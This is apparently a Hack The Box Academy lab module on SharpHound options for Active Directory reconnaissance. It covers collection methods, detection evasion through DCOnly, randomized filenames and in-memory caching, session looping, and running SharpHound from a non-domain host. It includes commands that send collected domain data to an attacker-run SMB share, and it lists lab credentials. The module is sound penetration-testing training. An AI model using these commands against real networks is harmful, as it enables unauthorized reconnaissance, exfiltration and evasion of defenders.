SharpHound has many interesting options that help us define what information we want and how we can collect it. This section will explore some of the most common options we can use in SharpHound, and links to the official documentation as a reference for all SharpHound options.

---

## SharpHound Options

We can use `--help` to list all SharpHound options. The following list corresponds to version 1.1.0:

#### SharpHound Options

```cmd
C:\Tools> SharpHound.exe --help
2023-01-10T13:08:39.2519248-06:00|INFORMATION|This version of SharpHound is compatible with the 4.2 Release of BloodHound
SharpHound 1.1.0
Copyright (C) 2023 SpecterOps

  -c, --collectionmethods      (Default: Default) Collection Methods: Group, LocalGroup, LocalAdmin, RDP, DCOM, PSRemote, Session, Trusts, ACL, Container,
                               ComputerOnly, GPOLocalGroup, LoggedOn, ObjectProps, SPNTargets, Default, DCOnly, All

  -d, --domain                 Specify domain to enumerate

  -s, --searchforest           (Default: false) Search all available domains in the forest

  --stealth                    Stealth Collection (Prefer DCOnly whenever possible!)

  -f                           Add an LDAP filter to the pregenerated filter.

  --distinguishedname          Base DistinguishedName to start the LDAP search at

  --computerfile               Path to file containing computer names to enumerate

  --outputdirectory            (Default: .) Directory to output file too

  --outputprefix               String to prepend to output file names

  --cachename                  Filename for cache (Defaults to a machine specific identifier)

  --memcache                   Keep cache in memory and don't write to disk

  --rebuildcache               (Default: false) Rebuild cache and remove all entries

  --randomfilenames            (Default: false) Use random filenames for output

  --zipfilename                Filename for the zip

  --nozip                      (Default: false) Don't zip files

  --zippassword                Password protects the zip with the specified password

  --trackcomputercalls         (Default: false) Adds a CSV tracking requests to computers

  --prettyprint                (Default: false) Pretty print JSON

  --ldapusername               Username for LDAP

  --ldappassword               Password for LDAP

  --domaincontroller           Override domain controller to pull LDAP from. This option can result in data loss

  --ldapport                   (Default: 0) Override port for LDAP

  --secureldap                 (Default: false) Connect to LDAP SSL instead of regular LDAP

  --disablecertverification    (Default: false) Disables certificate verification when using LDAPS

  --disablesigning             (Default: false) Disables Kerberos Signing/Sealing

  --skipportcheck              (Default: false) Skip checking if 445 is open

  --portchecktimeout           (Default: 500) Timeout for port checks in milliseconds

  --skippasswordcheck          (Default: false) Skip check for PwdLastSet when enumerating computers

  --excludedcs                 (Default: false) Exclude domain controllers from session/localgroup enumeration (mostly for ATA/ATP)

  --throttle                   Add a delay after computer requests in milliseconds

  --jitter                     Add jitter to throttle (percent)

  --threads                    (Default: 50) Number of threads to run enumeration with

  --skipregistryloggedon       Skip registry session enumeration

  --overrideusername           Override the username to filter for NetSessionEnum

  --realdnsname                Override DNS suffix for API calls

  --collectallproperties       Collect all LDAP properties from objects

  -l, --Loop                   Loop computer collection

  --loopduration               Loop duration (Defaults to 2 hours)

  --loopinterval               Delay between loops

  --statusinterval             (Default: 30000) Interval in which to display status in milliseconds

  -v                           (Default: 2) Enable verbose output

  --help                       Display this help screen.

  --version                    Display version information.
```

## [Collection Methods](https://bloodhound.readthedocs.io/en/latest/data-collection/sharphound-all-flags.html#collectionmethod)

The option `--collectionmethod` or `-c` allows us to specify what kind of data we want to collect. In the help menu above, we can see the list of collection methods. Let's describe some of them that we haven't covered:

- `All`: Performs all collection methods except `GPOLocalGroup`.
- `DCOnly`: Collects data only from the domain controller and will not try to get data from domain-joined Windows devices. It will collect users, computers, security groups memberships, domain trusts, abusable permissions on AD objects, OU structure, Group Policy, and the most relevant AD object properties. It will attempt to correlate Group Policy-enforced local groups to affected computers.
- `ComputerOnly`: This is the opposite of `DCOnly`. It will only collect information from domain-joined computers, such as user sessions and local groups.

Depending on the scenario we are in, we will choose the method that best suits our needs. Let's see the following use case:

We are in an environment with 2000 computers, and they have a SOC with some network monitoring tools. We use the `Default` collection method but forget the computer from where we run SharpHound, which will try to connect to every computer in the domain.

Our attack host started generating traffic to all workstations, and the SOC quarantined our machine.

In this scenario, we should use `DCOnly` instead of `All` or `Default`, as it generates only traffic to the domain controller. We could pick the most interesting target machine and add them to a list (e.g: `computers.txt`). Then, we would rerun SharpHound using the `ComputerOnly` collection method and the `--computerfile` option to try to enumerate only the computers in the `computers.txt` file.

It is essential to know the methods and their implications. The following table, created by [SadProcessor](https://twitter.com/SadProcessor), shows a general reference of the communication protocols used by each method and information on each technique, among other things:

![text](https://academy.hackthebox.com/storage/modules/69/SharpHoundCheatSheet.jpg)

**Note:** This table was created for an older version of SharpHound. Some options no longer exist, and others have been modified, but it still provides an overview of the collection methods and their implications. For more information, visit the [BloodHound documentation page](https://bloodhound.readthedocs.io/en/latest/data-collection/sharphound-all-flags.html).

## Common used flags

If we get credentials from a user other than the context from which we are running, we can use the `--ldapusername` and `--ldappassword` options to run SharpHound using those credentials.

Another flag we find helpful is `-d` or `--domain`. Although this option is assigned by default, if we are in an environment where multiple domains exist, we can use this option to ensure that SharpHound will collect the information from the domain we specify.

SharpHound will capture the domain controller automatically, but if we want to target a specific DC, we can use the option `--domaincontroller` followed by the IP or FQDN of the target domain controller. This option could help us target a forgotten or secondary domain, which may have less security or monitoring tools than the primary domain controller. Another use case for this flag is if we are doing port forward, we can specify an IP and port to target. We can use the flag `--ldapport` to select a port.

## Randomize and hide SharpHound Output

It is known that SharpHound, by default, generates different `.json` files, then saves them in a `zip` file. It also generates a randomly named file with a `.bin` extension corresponding to the cache of the queries it performs. Defense teams could use these patterns to detect bloodhound. One way to try to hide these traces is by combining some of these options:

|**Option**|**Description**|
|---|---|
|`--memcache`|Keep cache in memory and don't write to disk.|
|`--randomfilenames`|Generate random filenames for output, including the zip file.|
|`--outputprefix`|String to prepend to output file names.|
|`--outputdirectory`|Directory to output file too.|
|`--zipfilename`|Filename for the zip.|
|`--zippassword`|Password protects the zip with the specified password.|

For example, we can use the `--outputdirectory` to target a shared folder and randomize everything. Let's start a shared folder in our PwnBox:

#### Start the shared folder with username and password

```shell-session
BusySec@htb[/htb]$ sudo impacket-smbserver share ./ -smb2support -user test -password test
Impacket v0.10.1.dev1+20220720.103933.3c6713e3 - Copyright 2022 SecureAuth Corporation

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
```

Now let's connect to the shared folder and save SharpHound output there:

#### Connect to the shared folder with username and password

```cmd-session
C:\htb> net use \\10.10.14.33\share /user:test test
The command completed successfully.
```

#### Running SharpHound and saving the output to a shared folder

```cmd-session
C:\htb> C:\Tools\SharpHound.exe --memcache --outputdirectory \\10.10.14.33\share\ --zippassword HackTheBox --outputprefix HTB --randomfilenames
2023-01-11T11:31:43.4459137-06:00|INFORMATION|This version of SharpHound is compatible with the 4.2 Release of BloodHound
2023-01-11T11:31:43.5998704-06:00|INFORMATION|Resolved Collection Methods: Group, LocalAdmin, Session, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote
2023-01-11T11:31:43.6311043-06:00|INFORMATION|Initializing SharpHound at 11:31 AM on 1/11/2023
2023-01-11T11:31:55.0551988-06:00|INFORMATION|Flags: Group, LocalAdmin, Session, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote
2023-01-11T11:31:55.2710788-06:00|INFORMATION|Beginning LDAP search for INLANEFREIGHT.HTB
2023-01-11T11:31:55.3089182-06:00|INFORMATION|Producer has finished, closing LDAP channel
2023-01-11T11:31:55.3089182-06:00|INFORMATION|LDAP channel closed, waiting for consumers
2023-01-11T11:32:25.7331485-06:00|INFORMATION|Status: 0 objects finished (+0 0)/s -- Using 35 MB RAM
2023-01-11T11:32:41.7321172-06:00|INFORMATION|Consumers finished, closing output channel
2023-01-11T11:32:41.7633662-06:00|INFORMATION|Output channel closed, waiting for output task to complete
Closing writers
2023-01-11T11:32:52.2310202-06:00|INFORMATION|Status: 94 objects finished (+94 1.678571)/s -- Using 42 MB RAM
2023-01-11T11:32:52.2466171-06:00|INFORMATION|Enumeration finished in 00:00:56.9776773
2023-01-11T11:33:09.4855302-06:00|INFORMATION|SharpHound Enumeration Completed at 11:33 AM on 1/11/2023! Happy Graphing!
```

#### Unzipping the file

```shell-session
BusySec@htb[/htb]$ unzip ./HTB_20230111113143_5yssigbd.w3f
Archive:  ./HTB_20230111113143_5yssigbd.w3f
[./HTB_20230111113143_5yssigbd.w3f] HTB_20230111113143_hjclkslu.2in password: 
  inflating: HTB_20230111113143_hjclkslu.2in  
  inflating: HTB_20230111113143_hk3lxtz3.1ku  
  inflating: HTB_20230111113143_kghttiwp.jbq  
  inflating: HTB_20230111113143_kdg5svst.4sc  
  inflating: HTB_20230111113143_qeugxqep.lya  
  inflating: HTB_20230111113143_xsxzlxht.awa  
  inflating: HTB_20230111113143_51zkhw0e.bth
```


![text](https://academy.hackthebox.com/storage/modules/69/bh_upload_random_data.jpg)

**Note:** If we set a password to the zip file, we will need to unzip it first, but if we didn't, we could import the file as is, with the random name and extension and it will import it anyway.

## Session Loop Collection Method

When a user establishes a connection to a remote computer, it creates a session. The session information includes the username and the computer or IP from which the connection is coming. While active, the connection remains in the computer, but after the user disconnects, the session becomes idle and disappears in a few minutes. This means we have a small window of time to identify sessions and where users are active.

**Note:** In Active Directory environments, it is important to understand where users are connected because it helps us understand which computers to compromise to achieve our goals.

Let's open a command prompt in the target machine and type `net session` to identify if there are any session active:

#### Looking for Active Sessions

```cmd-session
C:\htb> net session
There are no entries in the list.
```

There are no active sessions, which means that if we run SharpHound right now, it will not find any session on our computer. When we run the SharpHound default collection method, it also includes the `Session` collection method. This method performs one round of session collection from the target computers. If it finds a session during that collection, it will collect it, but if the session expires, we won't have such information. That's why SharpHound includes the option `--loop`. We have a couple of options to use with loops in SharpHound:

|**Option**|**Description**|
|---|---|
|`--Loop`|Loop computer collection.|
|`--loopduration`|Duration to perform looping (Default 02:00:00).|
|`--loopinterval`|Interval to sleep between loops (Default 00:00:30).|
|`--stealth`|Perform "stealth" data collection. Only touch systems are the most likely to have user session data.|

If we want to search sessions for the following hour and query each computer every minute, we can use SharpHound as follow:

#### Session Loop

```cmd-session
C:\Tools> SharpHound.exe -c Session --loop --loopduration 01:00:00 --loopinterval 00:01:00
2023-01-11T14:15:48.9375275-06:00|INFORMATION|This version of SharpHound is compatible with the 4.2 Release of BloodHound
2023-01-11T14:15:49.1382880-06:00|INFORMATION|Resolved Collection Methods: Session
2023-01-11T14:15:49.1695244-06:00|INFORMATION|Initializing SharpHound at 2:15 PM on 1/11/2023
2023-01-11T14:16:00.4571231-06:00|INFORMATION|Flags: Session
2023-01-11T14:16:00.6108583-06:00|INFORMATION|Beginning LDAP search for INLANEFREIGHT.HTB
2023-01-11T14:16:00.6421492-06:00|INFORMATION|Producer has finished, closing LDAP channel
2023-01-11T14:16:00.6421492-06:00|INFORMATION|LDAP channel closed, waiting for consumers
2023-01-11T14:16:00.7268495-06:00|INFORMATION|Consumers finished, closing output channel
2023-01-11T14:16:00.7424755-06:00|INFORMATION|Output channel closed, waiting for output task to complete
Closing writers
2023-01-11T14:16:00.9587384-06:00|INFORMATION|Status: 4 objects finished (+4 Infinity)/s -- Using 35 MB RAM
2023-01-11T14:16:00.9587384-06:00|INFORMATION|Enumeration finished in 00:00:00.3535475
2023-01-11T14:16:01.0434611-06:00|INFORMATION|Creating loop manager with methods Session
2023-01-11T14:16:01.0434611-06:00|INFORMATION|Starting looping
2023-01-11T14:16:01.0434611-06:00|INFORMATION|Waiting 30 seconds before starting loop
2023-01-11T14:16:31.0598479-06:00|INFORMATION|Looping scheduled to stop at 01/11/2023 15:16:31
2023-01-11T14:16:31.0598479-06:00|INFORMATION|01/11/2023 14:16:31 - 01/11/2023 15:16:31
2023-01-11T14:16:31.0598479-06:00|INFORMATION|Starting loop 1 at 2:16 PM on 1/11/2023
2023-01-11T14:16:31.0754340-06:00|INFORMATION|Beginning LDAP search for INLANEFREIGHT.HTB
2023-01-11T14:16:31.0754340-06:00|INFORMATION|Producer has finished, closing LDAP channel
2023-01-11T14:16:31.0754340-06:00|INFORMATION|LDAP channel closed, waiting for consumers
2023-01-11T14:16:42.1893741-06:00|INFORMATION|Consumers finished, closing output channel
2023-01-11T14:16:42.1893741-06:00|INFORMATION|Output channel closed, waiting for output task to complete
...SNIP...
```

Watch the video [How BloodHound's session collection works](https://www.youtube.com/watch?v=q86VgM2Tafc) from the SpecterOps team for a deeper explanation of this collection method. Here is another excellent [blog post from Compass Security](https://blog.compass-security.com/2022/05/bloodhound-inner-workings-part-2/) regarding session enumeration by Sven Defatsch.

**Note:** BloodHound video was recorded before Microsoft introduced the requirement to be an administrator to collect session data.

## Running from Non-Domain-Joined Systems

Sometimes we might need to run SharpHound from a computer, not a domain member, such as when conducting a HackTheBox attack or internal penetration test with only network access.

In these scenarios, we can use `runas /netonly /user:<DOMAIN>\<username> <app>` to execute the application with specific user credentials. The `/netonly` flag ensures network access using the provided credentials.

Let's use a computer that is not a member of the domain for this and complete the following steps:

1. Connect via RDP to the target IP and port 13389 using the following credentials: `haris:Hackthebox`.

#### Connect via RDP to the

```shell-session
BusySec@htb[/htb]$ xfreerdp /v:10.129.204.207:13389 /u:haris /p:Hackthebox /dynamic-resolution /drive:.,linux                 
[12:13:14:635] [173624:173625] [INFO][com.freerdp.core] - freerdp_connect:freerdp_set_last_error_ex resetting error state
[12:13:14:635] [173624:173625] [INFO][com.freerdp.client.common.cmdline] - loading channelEx rdpdr                      
[12:13:14:635] [173624:173625] [INFO][com.freerdp.client.common.cmdline] - loading channelEx rdpsnd                 
[12:13:14:635] [173624:173625] [INFO][com.freerdp.client.common.cmdline] - loading channelEx cliprd
...SNIP...
```

Before using SharpHound, we need to be able to resolve the DNS names of the target domain, and if we have network access to the domain's DNS server, we can configure our network card DNS settings to that server. If this is not the case, we can set up our [hosts file](https://en.wikiversity.org/wiki/Hosts_file/Edit) and include the DNS names of the domain controller.

**Note:** Note that even when using the DNS name in the host file, you may introduce some errors due to name resolution issues that do not exist in the file or are misconfigured.

2. Configure the DNS server to the IP `172.16.130.3` (Domain Controller Internal IP). In this exercise the DNS are already configured, there is no need to change them.

![text](https://academy.hackthebox.com/storage/modules/69/configure_dns.jpg)

3. Run `cmd.exe` and execute the following command to launch another `cmd.exe` with the htb-student credentials. It will ask for a password. The password is `HTBRocks!`:

```cmd-session
C:\htb> runas /netonly /user:INLANEFREIGHT\htb-student cmd.exe
Enter the password for INLANEFREIGHT\htb-student:
Attempting to start cmd.exe as user "INLANEFREIGHT\htb-student" ...
```

![text](https://academy.hackthebox.com/storage/modules/69/runas_netonly.jpg)

**Note:** `runas /netonly` does not validate credentials, and if we use the wrong credentials, we will notice it while trying to connect through the network.

4. Execute `net view \\inlanefreight.htb\` to confirm we had successfully authenticated.

```cmd-session
C:\htb> net view \\inlanefreight.htb\
Shared resources at \\inlanefreight.htb\

Share name  Type  Used as  Comment.

-------------------------------------------------------------------------------
NETLOGON    Disk           Logon server share
SYSVOL      Disk           Logon server share
The command completed successfully.
```

5. Run SharpHound.exe with the option `--domain`:

```cmd-session
C:\Tools> SharpHound.exe -d inlanefreight.htb
2023-01-12T09:25:21.5040729-08:00|INFORMATION|This version of SharpHound is compatible with the 4.2 Release of BloodHound
2023-01-12T09:25:21.6603414-08:00|INFORMATION|Resolved Collection Methods: Group, LocalAdmin, Session, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote
2023-01-12T09:25:21.6760332-08:00|INFORMATION|Initializing SharpHound at 9:25 AM on 1/12/2023
2023-01-12T09:25:22.0197242-08:00|INFORMATION|Flags: Group, LocalAdmin, Session, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote
2023-01-12T09:25:22.2541585-08:00|INFORMATION|Beginning LDAP search for INLANEFREIGHT.HTB
2023-01-12T09:25:22.3010985-08:00|INFORMATION|Producer has finished, closing LDAP channel
2023-01-12T09:25:22.3010985-08:00|INFORMATION|LDAP channel closed, waiting for consumers
2023-01-12T09:25:52.3794310-08:00|INFORMATION|Status: 0 objects finished (+0 0)/s -- Using 36 MB RAM
2023-01-12T09:26:21.3792883-08:00|INFORMATION|Consumers finished, closing output channel
2023-01-12T09:26:21.4261266-08:00|INFORMATION|Output channel closed, waiting for output task to complete
Closing writers
2023-01-12T09:26:21.4885564-08:00|INFORMATION|Status: 94 objects finished (+94 1.59322)/s -- Using 44 MB RAM
2023-01-12T09:26:21.4885564-08:00|INFORMATION|Enumeration finished in 00:00:59.2357019
2023-01-12T09:26:21.5665717-08:00|INFORMATION|Saving cache with stats: 53 ID to type mappings.
 53 name to SID mappings.
 1 machine sid mappings.
 2 sid to domain mappings.
 0 global catalog mappings.
2023-01-12T09:26:21.5822432-08:00|INFORMATION|SharpHound Enumeration Completed at 9:26 AM on 1/12/2023! Happy Graphing!
```

